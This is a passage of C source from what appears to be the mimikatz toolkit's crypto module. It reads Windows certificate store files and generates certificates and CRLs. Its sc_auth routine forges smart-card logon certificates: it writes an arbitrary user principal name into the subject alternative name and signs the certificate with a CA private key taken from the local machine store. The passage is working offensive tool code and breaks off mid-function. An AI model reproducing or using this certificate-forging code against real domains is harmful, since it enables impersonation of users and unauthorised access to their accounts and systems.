			case CERT_KEY_PROV_INFO_PROP_ID:
				kprintf(L"Provider info:\n");
				provInfo = (PKUHL_M_CRYPTO_CRYPT_KEY_PROV_INFO) prop->data;
				if(provInfo->offsetContainerName)
					kprintf(L"\tKey Container  : %s\n", prop->data + provInfo->offsetContainerName);
				if(provInfo->offsetProvName)
					kprintf(L"\tProvider       : %s\n", prop->data + provInfo->offsetProvName);
				name = kull_m_crypto_provider_type_to_name(provInfo->dwProvType);
				kprintf(L"\tProvider type  : %s (%u)\n", name ? name : L"?", provInfo->dwProvType);
				kprintf(L"\tType           : %s (0x%08x)\n", kull_m_crypto_keytype_to_str(provInfo->dwKeySpec), provInfo->dwKeySpec);
				kprintf(L"\tFlags          : %08x\n", provInfo->dwFlags);
				kprintf(L"\tParam (todo)   : %08x / %08x\n", provInfo->cProvParam, provInfo->offsetRgProvParam);
				break;
			case CERT_FRIENDLY_NAME_PROP_ID:
			case CERT_OCSP_CACHE_PREFIX_PROP_ID:
			case 101: //CERT_SMART_CARD_READER_PROP_ID
				kprintf(L"%.*s", prop->size / sizeof(wchar_t), prop->data);
				break;
			case CERT_cert_file_element:
			case CERT_crl_file_element:
			case CERT_ctl_file_element:
			case CERT_keyid_file_element:
				kuhl_m_crypto_file_rawData(prop, originalName, isExport);
				break;
			case CERT_SHA1_HASH_PROP_ID:
			case CERT_MD5_HASH_PROP_ID :
			case CERT_SIGNATURE_HASH_PROP_ID:
			case CERT_ISSUER_PUBLIC_KEY_MD5_HASH_PROP_ID:
			case CERT_SUBJECT_PUBLIC_KEY_MD5_HASH_PROP_ID:
			case CERT_ISSUER_SERIAL_NUMBER_MD5_HASH_PROP_ID:
			case CERT_SUBJECT_NAME_MD5_HASH_PROP_ID:
			case CERT_KEY_IDENTIFIER_PROP_ID:
				//
			default:
				kull_m_string_wprintf_hex(prop->data, prop->size, 0);
				break;
			}
			kprintf(L"\n");
		}
	}

	return status;
}

BOOL CALLBACK kuhl_m_crypto_system_directory(DWORD level, PCWCHAR fullpath, PCWCHAR path, PVOID pvArg)
{
	PBYTE fileData;
	DWORD fileLenght;
	if(fullpath)
	{
		kprintf(L"\n* File: \'%s\'\n", fullpath);
		if(kull_m_file_readData(fullpath, &fileData, &fileLenght))
		{
			kuhl_m_crypto_system_data(fileData, fileLenght, fullpath, *(PBOOL) pvArg);
			LocalFree(fileData);
		}
	}
	return FALSE;
}

NTSTATUS kuhl_m_crypto_system(int argc, wchar_t * argv[])
{
	BOOL isExport = kull_m_string_args_byName(argc, argv, L"export", NULL, NULL);
	PCWCHAR infile;

	if(kull_m_string_args_byName(argc, argv, L"file", &infile, NULL)) // TODO: registry & hive
	{
		if(PathIsDirectory(infile))
		{
			kprintf(L"* Directory: \'%s\'\n", infile);
			kull_m_file_Find(infile, NULL, FALSE, 0, FALSE, kuhl_m_crypto_system_directory, &isExport);
		}
		else kuhl_m_crypto_system_directory(0, infile, PathFindFileName(infile), &isExport);
	}
	else PRINT_ERROR(L"Input Microsoft Crypto Certificate file needed (/file:filename|directory)\n");
	return STATUS_SUCCESS;
}

void kuhl_m_crypto_file_rawData(PKUHL_M_CRYPTO_CERT_PROP prop, PCWCHAR inFile, BOOL isExport)
{
	PCWCHAR type, file = PathFindFileName(inFile);
	wchar_t * buffer;
	size_t charCount;

	switch(prop->dwPropId)
	{
	case CERT_cert_file_element:
		type = L"der";
		break;
	case CERT_crl_file_element:
		type = L"crl";
		break;
	case CERT_ctl_file_element:
		type = L"ctl";
		break;
	case CERT_keyid_file_element:
		type = L"keyid";
		break;
	default:
		type = NULL;
	}

	if(type)
	{
		kprintf(L"Data: ");
		kull_m_string_wprintf_hex(prop->data, prop->size, 0);
		kprintf(L"\n");
		if(isExport)
		{
			kprintf(L"  ");
			charCount = wcslen(file) + 1 + wcslen(type) + 1;
			if(buffer = (wchar_t *) LocalAlloc(LPTR, (charCount) * sizeof(wchar_t)))
			{
				if(swprintf_s(buffer, charCount, L"%s.%s", file, type) > 0)
				{
					if(kull_m_file_writeData(buffer, prop->data, prop->size))
						kprintf(L"Saved to file: %s\n", buffer);
					else PRINT_ERROR_AUTO(L"kull_m_file_writeData");
				}
				LocalFree(buffer);
			}
		}
	}
}

BOOL kuhl_m_crypto_c_sc_auth_quickEncode(__in LPCSTR lpszStructType, __in const void *pvStructInfo, PDATA_BLOB data)
{
	BOOL status = FALSE;
	data->cbData = 0;
	data->pbData = NULL;
	if(CryptEncodeObject(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING, lpszStructType, pvStructInfo, NULL, &data->cbData))
	{
		if(data->pbData = (PBYTE) LocalAlloc(LPTR, data->cbData))
		{
			if(!(status = CryptEncodeObject(PKCS_7_ASN_ENCODING | X509_ASN_ENCODING, lpszStructType, pvStructInfo, data->pbData, &data->cbData)))
			{
				PRINT_ERROR_AUTO(L"CryptEncodeObject (data)");
				LocalFree(data->pbData);
			}
		}
	}
	else PRINT_ERROR_AUTO(L"CryptEncodeObject (init)");
	return status;
}

BOOL kuhl_m_crypto_c_sc_auth_Ext_AltUPN(PCERT_EXTENSION pCertExtension, LPCWSTR upn)
{
	BOOL status = FALSE;
	CERT_NAME_VALUE otherNameValue = {CERT_RDN_UTF8_STRING, (DWORD) wcslen(upn) * sizeof(wchar_t), (PBYTE) upn};
	CERT_OTHER_NAME otherName = {szOID_NT_PRINCIPAL_NAME, {0, NULL}};
	CERT_ALT_NAME_ENTRY altName = {CERT_ALT_NAME_OTHER_NAME, &otherName};
	CERT_ALT_NAME_INFO AltName = {1, &altName};
	pCertExtension->pszObjId = szOID_SUBJECT_ALT_NAME2;
	pCertExtension->fCritical = FALSE;
	if(kuhl_m_crypto_c_sc_auth_quickEncode(X509_UNICODE_ANY_STRING, &otherNameValue, &otherName.Value))
	{
		status = kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &AltName, &pCertExtension->Value);
		LocalFree(otherName.Value.pbData);
	}
	return status;
}

BOOL kuhl_m_crypto_c_sc_auth_Ext_KU(PCERT_EXTENSION pCertExtension, BOOL isCritical, WORD bits)
{
	CRYPT_BIT_BLOB bit = {sizeof(bits), (PBYTE) &bits, 5};
	pCertExtension->pszObjId = szOID_KEY_USAGE;
	pCertExtension->fCritical = isCritical;
	return kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &bit, &pCertExtension->Value);
}

BOOL kuhl_m_crypto_c_sc_auth_Ext_EKU(PCERT_EXTENSION pCertExtension, DWORD count, ...)
{
	BOOL status = FALSE;
	DWORD i;
	va_list vaList;
	CERT_ENHKEY_USAGE usage = {count, NULL};
	pCertExtension->pszObjId = szOID_ENHANCED_KEY_USAGE;
	pCertExtension->fCritical = FALSE;
	if(usage.rgpszUsageIdentifier = (LPSTR *) LocalAlloc(LPTR, sizeof(LPSTR) * count))
	{
		va_start(vaList, count); 
		for(i = 0; i < count; i++)
			usage.rgpszUsageIdentifier[i] =  va_arg(vaList, LPSTR);
		va_end(vaList);
		status = kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &usage, &pCertExtension->Value);
		LocalFree(usage.rgpszUsageIdentifier);
	}
	return status;
}

__inline void kuhl_m_crypto_c_sc_auth_Ext_Free(PCERT_EXTENSION pCertExtension)
{
	if(pCertExtension->Value.pbData)
		LocalFree(pCertExtension->Value.pbData);
}

BOOL giveski(PCERT_EXTENSION pCertExtension, PCERT_PUBLIC_KEY_INFO info)
{
	SHA_CTX ctx;
	SHA_DIGEST dgst;
	CRYPT_DATA_BLOB bit = {sizeof(dgst.digest), dgst.digest};
	A_SHAInit(&ctx);
	A_SHAUpdate(&ctx, info->PublicKey.pbData, info->PublicKey.cbData);
	A_SHAFinal(&ctx, &dgst);
	pCertExtension->pszObjId = szOID_SUBJECT_KEY_IDENTIFIER;
	pCertExtension->fCritical = FALSE;
	return kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &bit, &pCertExtension->Value);
}

BOOL giveaki(PCERT_EXTENSION pCertExtension, PCERT_PUBLIC_KEY_INFO info)
{
	SHA_CTX ctx;
	SHA_DIGEST dgst;
	CERT_AUTHORITY_KEY_ID2_INFO ainfo = {{sizeof(dgst.digest), dgst.digest}, {0, NULL}, {0, NULL}};
	A_SHAInit(&ctx);
	A_SHAUpdate(&ctx, info->PublicKey.pbData, info->PublicKey.cbData);
	A_SHAFinal(&ctx, &dgst);
	pCertExtension->pszObjId = szOID_AUTHORITY_KEY_IDENTIFIER2;
	pCertExtension->fCritical = FALSE;
	return kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &ainfo, &pCertExtension->Value);
}

BOOL kuhl_m_crypto_c_sc_auth_Ext_CDP(PCERT_EXTENSION pCertExtension, DWORD count, ...)
{
	BOOL status = FALSE;
	CRL_DIST_POINT point = {{CRL_DIST_POINT_FULL_NAME, {count, NULL}}, {0, NULL, 0}, {0, NULL}};
	CRL_DIST_POINTS_INFO crl = {1, &point};
	va_list vaList;
	DWORD i;
	pCertExtension->pszObjId = szOID_CRL_DIST_POINTS;
	pCertExtension->fCritical = FALSE;
	if(point.DistPointName.FullName.rgAltEntry = (PCERT_ALT_NAME_ENTRY) LocalAlloc(LPTR, sizeof(CERT_ALT_NAME_ENTRY) * count))
	{
		va_start(vaList, count); 
		for(i = 0; i < count; i++)
		{
			point.DistPointName.FullName.rgAltEntry[i].dwAltNameChoice = CERT_ALT_NAME_URL;
			point.DistPointName.FullName.rgAltEntry[i].pwszURL = va_arg(vaList, LPWSTR);
		}
		va_end(vaList);
		status = kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, &crl, &pCertExtension->Value);
		LocalFree(point.DistPointName.FullName.rgAltEntry);
	}
	return status;
}

BOOL givebc2(PCERT_EXTENSION pCertExtension, PCERT_BASIC_CONSTRAINTS2_INFO info)
{
	pCertExtension->pszObjId = szOID_BASIC_CONSTRAINTS2;
	pCertExtension->fCritical = info->fCA; // :)
	return kuhl_m_crypto_c_sc_auth_quickEncode(pCertExtension->pszObjId, info, &pCertExtension->Value);
}

BOOL genRdnAttr(PCERT_RDN_ATTR attr, LPSTR oid, LPCWSTR name)
{
	BOOL status = FALSE;
	if(attr && name && oid)
	{
		attr->pszObjId = oid;
		attr->dwValueType = CERT_RDN_UNICODE_STRING;
		attr->Value.cbData = lstrlenW(name) * sizeof(wchar_t);
		attr->Value.pbData = (PBYTE) name;
		status = TRUE;
	}
	return status;
}

PCERT_PUBLIC_KEY_INFO getPublicKeyInfo(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hProv, DWORD dwKeySpec)
{
	PCERT_PUBLIC_KEY_INFO info = NULL;
	DWORD cbInfo;
	if(CryptExportPublicKeyInfo(hProv, dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, NULL, &cbInfo))
	{
		if(info = (PCERT_PUBLIC_KEY_INFO) LocalAlloc(LPTR, cbInfo))
		{
			if(!CryptExportPublicKeyInfo(hProv, dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, info, &cbInfo))
			{
				PRINT_ERROR_AUTO(L"CryptExportPublicKeyInfo (data)");
				info = (PCERT_PUBLIC_KEY_INFO) LocalFree(info);
			}
		}
	}
	else PRINT_ERROR_AUTO(L"CryptExportPublicKeyInfo (init)");
	return info;
}

BOOL makePin(HCRYPTPROV hProv, BOOL isHw, LPSTR pin)
{
	BOOL status = FALSE;
	if(isHw && pin)
	{
		if(!(status = CryptSetProvParam(hProv, PP_KEYEXCHANGE_PIN, (const BYTE *) pin, 0)))
			PRINT_ERROR_AUTO(L"CryptSetProvParam(PP_KEYEXCHANGE_PIN)");
	}
	else status = TRUE;
	return status;
}

BOOL makeSN(LPCWCHAR szSn, PCRYPT_INTEGER_BLOB sn)
{
	BOOL status = FALSE;
	if(szSn)
	{
		status = kull_m_string_stringToHexBuffer(szSn, &sn->pbData, &sn->cbData);
		if(!status)
			PRINT_ERROR(L"Unable to use \'%s\' as a HEX string\n", szSn);
	}
	else
	{
		sn->cbData = 20;
		if(sn->pbData = (PBYTE) LocalAlloc(LPTR, sn->cbData))
		{
			status = NT_SUCCESS(CDGenerateRandomBits(sn->pbData, sn->cbData));
			if(!status)
				LocalFree(sn->pbData);
		}
	}
	return status;
}

BOOL getCertificate(HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hProv, DWORD dwKeySpec, LPCSTR type, const void *pvStructInfo, PCRYPT_ALGORITHM_IDENTIFIER pSignatureAlgorithm, PBYTE *Certificate, DWORD *cbCertificate)
{
	BOOL status = FALSE;
	if(CryptSignAndEncodeCertificate(hProv, dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, type, pvStructInfo, pSignatureAlgorithm, NULL, NULL, cbCertificate))
	{
		if(*Certificate = (PBYTE) LocalAlloc(LPTR, *cbCertificate))
		{
			if(!(status = CryptSignAndEncodeCertificate(hProv, dwKeySpec, X509_ASN_ENCODING | PKCS_7_ASN_ENCODING, type, pvStructInfo, pSignatureAlgorithm, NULL, *Certificate, cbCertificate)))
			{
				PRINT_ERROR_AUTO(L"CryptSignAndEncodeCertificate (data)");
				*Certificate = (PBYTE) LocalFree(*Certificate);
			}
		}
	}
	else PRINT_ERROR_AUTO(L"CryptSignAndEncodeCertificate (init)");
	return status;
}

PWSTR getCertificateName(PCERT_NAME_BLOB blob)
{
	PWSTR ret = NULL;
	DWORD dwSizeNeeded = CertNameToStr(X509_ASN_ENCODING, blob, CERT_X500_NAME_STR, NULL, 0);
	if(dwSizeNeeded)
	{
		if(ret = (PWSTR) LocalAlloc(LPTR, dwSizeNeeded * sizeof(wchar_t)))
		{
			if(!CertNameToStr(X509_ASN_ENCODING, blob, CERT_X500_NAME_STR, ret, dwSizeNeeded))
				ret = (PWSTR) LocalFree(ret);
		}
	}
	return ret;
}

typedef struct _KIWI_KEY_INFO {
	CRYPT_KEY_PROV_INFO keyInfos;
	LPSTR pin;
	DWORD dwKeyFlags;
	WORD wKeySize;
	HCRYPTPROV hProv;
} KIWI_KEY_INFO, *PKIWI_KEY_INFO;

typedef struct _KIWI_CERT_INFO {
	LPFILETIME notbefore; // do NOT move
	LPFILETIME notafter; // do NOT move
	LPCWSTR cn;
	LPCWSTR ou;
	LPCWSTR o;
	LPCWSTR c;
	LPCWSTR sn;
	WORD ku;
	LPSTR algorithm;
	BOOL isAC;
	PCERT_EXTENSION eku;
	PCERT_EXTENSION san;
	PCERT_EXTENSION cdp;
} KIWI_CERT_INFO, *PKIWI_CERT_INFO;

typedef struct _KIWI_CRL_INFO {
	LPFILETIME thisupdate; // do NOT move
	LPFILETIME nextupdate; // do NOT move
	LPSTR algorithm;
	int crlnumber;
	// ...
} KIWI_CRL_INFO, *PKIWI_CRL_INFO;

typedef struct _KIWI_SIGNER {
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hProv;
	DWORD dwKeySpec;
	FILETIME NotBefore;
	FILETIME NotAfter;
	CERT_NAME_BLOB Subject;
} KIWI_SIGNER, *PKIWI_SIGNER;

void getDate(PFILETIME s, PFILETIME e, PVOID certOrCrlinfo, PCCERT_CONTEXT signer, PKIWI_SIGNER dSigner)
{
	PFILETIME *info = (PFILETIME *) certOrCrlinfo;
	if(info[0])
		*s = *info[0];
	else
	{
		if(signer && *(PULONG) &signer->pCertInfo->NotBefore)
			*s = signer->pCertInfo->NotBefore;
		else if(dSigner && *(PULONG) &dSigner->NotBefore)
			*s = dSigner->NotBefore;
		else GetSystemTimeAsFileTime(s);
	}
	if(info[1])
		*e = *info[1];
	else
	{
		if(signer && *(PULONG) &signer->pCertInfo->NotAfter)
			*e = signer->pCertInfo->NotAfter;
		else if(dSigner && *(PULONG) &dSigner->NotAfter)
			*e = dSigner->NotAfter;
		else
		{
			*e = *s;
			*(PULONGLONG) e += (ULONGLONG) 10000000 * 60 * 60 * 24 * 365 * 10;
		}
	}
}

BOOL closeHprov(BOOL bFreeKey, DWORD dwSpec, HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hProv)
{
	BOOL status = !bFreeKey;
	if(hProv && bFreeKey)
	{
		if(dwSpec != CERT_NCRYPT_KEY_SPEC)
			status = CryptReleaseContext(hProv, 0);
		else
		{
			__try
			{
				status = (NCryptFreeObject(hProv) == ERROR_SUCCESS);
			}
			__except(GetExceptionCode() == ERROR_DLL_NOT_FOUND)
			{
				PRINT_ERROR(L"CNG key without functions?\n");
			}
		}
	}
	return status;
}

BOOL getFromSigner(PCCERT_CONTEXT signer, PKIWI_SIGNER dSigner, HCRYPTPROV_OR_NCRYPT_KEY_HANDLE *hSigner, DWORD *dwSignerKeySpec, BOOL *bFreeSignerKey, PCERT_EXTENSION aki, CERT_NAME_BLOB *nameIssuer)
{
	BOOL status = FALSE;
	DWORD dwSizeNeeded;
	PCRYPT_KEY_PROV_INFO pBuffer;
	PCERT_PUBLIC_KEY_INFO pbSignerPublicKeyInfo;

	if(signer)
	{
		*nameIssuer = signer->pCertInfo->Subject;
		if(CertGetCertificateContextProperty(signer, CERT_KEY_PROV_INFO_PROP_ID, NULL, &dwSizeNeeded))
		{
			if(pBuffer = (PCRYPT_KEY_PROV_INFO) LocalAlloc(LPTR, dwSizeNeeded))
			{
				if(CertGetCertificateContextProperty(signer, CERT_KEY_PROV_INFO_PROP_ID, pBuffer, &dwSizeNeeded))
					kprintf(L" [i.key ] provider : %s\n [i.key ] container: %s\n", pBuffer->pwszProvName, pBuffer->pwszContainerName);
				LocalFree(pBuffer);
			}
		}
		if(CryptAcquireCertificatePrivateKey(signer, CRYPT_ACQUIRE_CACHE_FLAG | CRYPT_ACQUIRE_ALLOW_NCRYPT_KEY_FLAG, NULL, hSigner, dwSignerKeySpec, bFreeSignerKey))
		{
			if(pbSignerPublicKeyInfo = getPublicKeyInfo(*hSigner, *dwSignerKeySpec))
			{
				status = giveaki(aki, pbSignerPublicKeyInfo);
				LocalFree(pbSignerPublicKeyInfo);
			}
			if(!status)
				closeHprov(*bFreeSignerKey, *dwSignerKeySpec, *hSigner);
		}
		else PRINT_ERROR_AUTO(L"CryptAcquireCertificatePrivateKey(signer)");
	}
	else if(dSigner)
	{
		*nameIssuer = dSigner->Subject;
		*hSigner = dSigner->hProv;
		*dwSignerKeySpec = dSigner->dwKeySpec;
		*bFreeSignerKey = FALSE;
		if(pbSignerPublicKeyInfo = getPublicKeyInfo(*hSigner, *dwSignerKeySpec))
		{
			status = giveaki(aki, pbSignerPublicKeyInfo);
			LocalFree(pbSignerPublicKeyInfo);
		}
	}

	if(!status)
	{
		*hSigner = 0;
		*bFreeSignerKey = FALSE;
	}
	return status;
}

BOOL generateCrl(PKIWI_CRL_INFO ci, PCCERT_CONTEXT signer, PKIWI_SIGNER dSigner, PBYTE *Crl, DWORD *cbCrl)
{
	BOOL status = FALSE, isHw = FALSE, bFreeSignerKey;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hSigner = 0;
	DWORD dwSignerKeySpec;

	CERT_EXTENSION Extensions[2] = {0}; // AKI, CRL Number
	CRL_INFO CrlInfo = {0};
	PWSTR dn;

	CrlInfo.dwVersion = CRL_V2;
	CrlInfo.cExtension = ARRAYSIZE(Extensions);
	CrlInfo.rgExtension = Extensions;
	CrlInfo.SignatureAlgorithm.pszObjId = ci->algorithm ? ci->algorithm : szOID_RSA_SHA1RSA;

	getDate(&CrlInfo.ThisUpdate, &CrlInfo.NextUpdate, ci, signer, dSigner);

	CrlInfo.rgExtension[0].pszObjId = szOID_CRL_NUMBER;
	CrlInfo.rgExtension[0].fCritical = FALSE;
	if(kuhl_m_crypto_c_sc_auth_quickEncode(CrlInfo.rgExtension[0].pszObjId, &ci->crlnumber, &CrlInfo.rgExtension[0].Value))
	{
		kprintf(L"[s.crl ] algorithm : %S\n", CrlInfo.SignatureAlgorithm.pszObjId);
		kprintf(L"[s.crl ] validity  : ");
		kull_m_string_displayLocalFileTime(&CrlInfo.ThisUpdate);
		kprintf(L" -> ");
		kull_m_string_displayLocalFileTime(&CrlInfo.NextUpdate);
		kprintf(L"\n");

		if(getFromSigner(signer, dSigner, &hSigner, &dwSignerKeySpec, &bFreeSignerKey, &CrlInfo.rgExtension[1], &CrlInfo.Issuer))
		{
			if(dn = getCertificateName(&CrlInfo.Issuer))
			{
				kprintf(L" [i.cert] subject  : %s\n", dn);
				LocalFree(dn);
			}
			kprintf(L"[s.crl ] signature : ");
			if(status = getCertificate(hSigner, dwSignerKeySpec, X509_CERT_CRL_TO_BE_SIGNED, &CrlInfo, &CrlInfo.SignatureAlgorithm, Crl, cbCrl))
				kprintf(L"OK\n");
			closeHprov(bFreeSignerKey, dwSignerKeySpec, hSigner);
			LocalFree(CrlInfo.rgExtension[1].Value.pbData);
		}
		LocalFree(CrlInfo.rgExtension[0].Value.pbData);
	}
	else PRINT_ERROR(L"Unable to create CRL Number\n");
	return status;
}

BOOL generateCertificate(PKIWI_KEY_INFO ki, PKIWI_CERT_INFO ci, PCCERT_CONTEXT signer, PKIWI_SIGNER dSigner, PBYTE *Certificate, DWORD *cbCertificate, PKIWI_SIGNER oSigner)
{
	BOOL status = FALSE, isHw = FALSE, bFreeSignerKey;
	HCRYPTPROV_OR_NCRYPT_KEY_HANDLE hSigner;
	HCRYPTKEY hKey;
	DWORD dwImplType, dwSignerKeySpec;

	PCERT_PUBLIC_KEY_INFO pbPublicKeyInfo;
	CERT_RDN_ATTR rgNameAttr[4];
	CERT_RDN rgRDN[4] = {{1, NULL}, {1, NULL}, {1, NULL}, {1, NULL}};
	CERT_NAME_INFO Name = {0, rgRDN};
	CERT_BASIC_CONSTRAINTS2_INFO bc2 = {ci->isAC, FALSE, 0}; // no len constraint
	CERT_EXTENSION Extensions[7] = {0}, *pAki = NULL; // KU, SKI, BC2, [AKI, EKU, CRLDP, SAN]
	CERT_INFO CertInfo = {0};

	PWSTR dn;

	CertInfo.dwVersion = CERT_V3;
	CertInfo.cExtension = 3; // KU, SKI, BC2
	CertInfo.rgExtension = Extensions;
	CertInfo.SignatureAlgorithm.pszObjId = ci->algorithm ? ci->algorithm : szOID_RSA_SHA1RSA;

	if(genRdnAttr(&rgNameAttr[0], szOID_COMMON_NAME, ci->cn))
		rgRDN[Name.cRDN++].rgRDNAttr = &rgNameAttr[0];
	if(genRdnAttr(&rgNameAttr[1], szOID_ORGANIZATIONAL_UNIT_NAME, ci->ou))
		rgRDN[Name.cRDN++].rgRDNAttr = &rgNameAttr[1];
	if(genRdnAttr(&rgNameAttr[2], szOID_ORGANIZATION_NAME, ci->o))
		rgRDN[Name.cRDN++].rgRDNAttr = &rgNameAttr[2];
	if(genRdnAttr(&rgNameAttr[3], szOID_COUNTRY_NAME, ci->c))
		rgRDN[Name.cRDN++].rgRDNAttr = &rgNameAttr[3];

	getDate(&CertInfo.NotBefore, &CertInfo.NotAfter, ci, signer, dSigner);

	if(kuhl_m_crypto_c_sc_auth_quickEncode(X509_NAME, &Name, &CertInfo.Subject))
	{
		if(dn = getCertificateName(&CertInfo.Subject))
		{
			kprintf(L"[s.cert] subject   : %s\n", dn);
			LocalFree(dn);
		}
		if(makeSN(ci->sn, &CertInfo.SerialNumber))
		{
			kprintf(L"[s.cert] serial    : ");
			kull_m_string_wprintf_hex(CertInfo.SerialNumber.pbData, CertInfo.SerialNumber.cbData, 0);
			kprintf(L"\n");

			if(kuhl_m_crypto_c_sc_auth_Ext_KU(&CertInfo.rgExtension[0], TRUE, ci->ku))
			{
				if(givebc2(&CertInfo.rgExtension[1], &bc2))
				{
					if(ci->eku)
						CertInfo.rgExtension[CertInfo.cExtension++] = *ci->eku;
					if(ci->san)
						CertInfo.rgExtension[CertInfo.cExtension++] = *ci->san;
					if(ci->cdp)
						CertInfo.rgExtension[CertInfo.cExtension++] = *ci->cdp;

					kprintf(L"[s.cert] algorithm : %S\n", CertInfo.SignatureAlgorithm.pszObjId);
					kprintf(L"[s.cert] validity  : ");
					kull_m_string_displayLocalFileTime(&CertInfo.NotBefore);
					kprintf(L" -> ");
					kull_m_string_displayLocalFileTime(&CertInfo.NotAfter);
					kprintf(L"\n");

					kprintf(L"[s.key ] provider  : %s\n", ki->keyInfos.pwszProvName);
					if(ki->keyInfos.pwszContainerName = kull_m_string_getRandomGUID())
					{
						kprintf(L"[s.key ] container : %s\n", ki->keyInfos.pwszContainerName);
						if(CryptAcquireContext(&ki->hProv, NULL, ki->keyInfos.pwszProvName, ki->keyInfos.dwProvType, CRYPT_VERIFYCONTEXT | CRYPT_SILENT))
						{
							dwSignerKeySpec = sizeof(DWORD);
							if(CryptGetProvParam(ki->hProv, PP_IMPTYPE, (PBYTE) &dwImplType, &dwSignerKeySpec, 0))
								isHw = dwImplType & CRYPT_IMPL_HARDWARE;
							if(isHw)
							{
								ki->keyInfos.dwFlags &= ~CRYPT_SILENT;
								ki->dwKeyFlags &= ~CRYPT_EXPORTABLE;
								makePin(ki->hProv, isHw, ki->pin);
							}
							CryptReleaseContext(ki->hProv, 0);
						}

						if(CryptAcquireContext(&ki->hProv, ki->keyInfos.pwszContainerName, ki->keyInfos.pwszProvName, ki->keyInfos.dwProvType, CRYPT_NEWKEYSET | ki->keyInfos.dwFlags))
						{
							makePin(ki->hProv, isHw, ki->pin);
							kprintf(L"[s.key ] gen (%4hu): ", ki->wKeySize);
							if(CryptGenKey(ki->hProv, ki->keyInfos.dwKeySpec, ki->dwKeyFlags | (ki->wKeySize << 16), &hKey))
							{
								kprintf(L"OK\n");
								if(pbPublicKeyInfo = getPublicKeyInfo(ki->hProv, ki->keyInfos.dwKeySpec))
								{
									CertInfo.SubjectPublicKeyInfo = *pbPublicKeyInfo;
									if(giveski(&CertInfo.rgExtension[2], pbPublicKeyInfo))
									{
										if(getFromSigner(signer, dSigner, &hSigner, &dwSignerKeySpec, &bFreeSignerKey, &CertInfo.rgExtension[CertInfo.cExtension], &CertInfo.Issuer))
										{
											pAki = &CertInfo.rgExtension[CertInfo.cExtension++];
											if(dn = getCertificateName(&CertInfo.Issuer))
											{
												kprintf(L" [i.cert] subject  : %s\n", dn);
												LocalFree(dn);
											}
										}
										else CertInfo.Issuer = CertInfo.Subject;

										kprintf(L"[s.cert] signature : ");
										if(status = getCertificate(hSigner ? hSigner : ki->hProv, hSigner ? dwSignerKeySpec : ki->keyInfos.dwKeySpec, X509_CERT_TO_BE_SIGNED, &CertInfo, &CertInfo.SignatureAlgorithm, Certificate, cbCertificate))
										{
											kprintf(L"OK\n");
											if(isHw)
											{
												kprintf(L"[s.key ] cert.assoc: ");
												if(CryptSetKeyParam(hKey, KP_CERTIFICATE, *Certificate, 0))
													kprintf(L"OK\n");
												else PRINT_ERROR_AUTO(L"CryptSetKeyParam(KP_CERTIFICATE)");
											}
											if(oSigner)
											{
												oSigner->hProv = ki->hProv;
												oSigner->dwKeySpec = ki->keyInfos.dwKeySpec;
												oSigner->NotBefore = CertInfo.NotBefore;
												oSigner->NotAfter = CertInfo.NotAfter;
												oSigner->Subject.cbData = CertInfo.Subject.cbData;
												if(oSigner->Subject.pbData = (PBYTE) LocalAlloc(LPTR, oSigner->Subject.cbData))
													RtlCopyMemory(oSigner->Subject.pbData, CertInfo.Subject.pbData, oSigner->Subject.cbData);
												else status = FALSE;
											}
										}
										
										if(pAki)
											LocalFree(pAki->Value.pbData);
										
										closeHprov(bFreeSignerKey, dwSignerKeySpec, hSigner);
										LocalFree(&CertInfo.rgExtension[2].Value.pbData);
									}
									else PRINT_ERROR(L"Unable to create SKI\n");
								}
								CryptDestroyKey(hKey);
							}
							else PRINT_ERROR_AUTO(L"CryptGenKey");
							if(!status)
								CryptReleaseContext(ki->hProv, 0);
						}
						else PRINT_ERROR_AUTO(L"CryptAcquireContext(CRYPT_NEWKEYSET)");
						if(!status)
							LocalFree(ki->keyInfos.pwszContainerName);
					}
					else PRINT_ERROR(L"Unable to generate a container name\n");
					LocalFree(&CertInfo.rgExtension[1].Value.pbData);
				}
				else PRINT_ERROR(L"Unable to create BC2\n");
				LocalFree(&CertInfo.rgExtension[0].Value.pbData);
			}
			else PRINT_ERROR(L"Unable to create KU\n");
			LocalFree(CertInfo.SerialNumber.pbData);
		}
		else PRINT_ERROR(L"Unable to create SN\n");
		LocalFree(CertInfo.Subject.pbData);
	}
	else PRINT_ERROR(L"Unable to create Subject\n");
	return status;
}

NTSTATUS kuhl_m_crypto_c_sc_auth(int argc, wchar_t * argv[])
{
	LPCWSTR szStoreCA, szNameCA, szPfx = NULL, szPin, szCrlDp;
	HCERTSTORE hCertStoreCA;
	PCCERT_CONTEXT pCertCtxCA;
	BOOL isExported = FALSE;
	CERT_EXTENSION eku = {0}, san = {0}, cdp = {0};
	DWORD szCertificate = 0;
	PBYTE Certificate = NULL;
	KIWI_KEY_INFO ki = {{NULL, MS_ENHANCED_PROV, PROV_RSA_FULL, CRYPT_SILENT, 0, NULL, AT_KEYEXCHANGE}, NULL, CRYPT_EXPORTABLE, 2048};
	KIWI_CERT_INFO ci = {NULL, NULL, NULL, NULL, MIMIKATZ, L"FR", NULL, CERT_DIGITAL_SIGNATURE_KEY_USAGE | CERT_KEY_ENCIPHERMENT_KEY_USAGE, szOID_OIWSEC_sha1RSASign/*szOID_RSA_SHA256RSA*/, FALSE, &eku, &san, NULL};

	if(kull_m_string_args_byName(argc, argv, L"hw", NULL, NULL))
	{
		kull_m_string_args_byName(argc, argv, L"csp", &ki.keyInfos.pwszProvName, MS_SCARD_PROV);
		if(kull_m_string_args_byName(argc, argv, L"pin", &szPin, NULL))
			ki.pin = kull_m_string_unicode_to_ansi(szPin);
	}

	kull_m_string_args_byName(argc, argv, L"castore", &szStoreCA, L"LOCAL_MACHINE");
	if(kull_m_string_args_byName(argc, argv, L"caname", &szNameCA, NULL))
	{
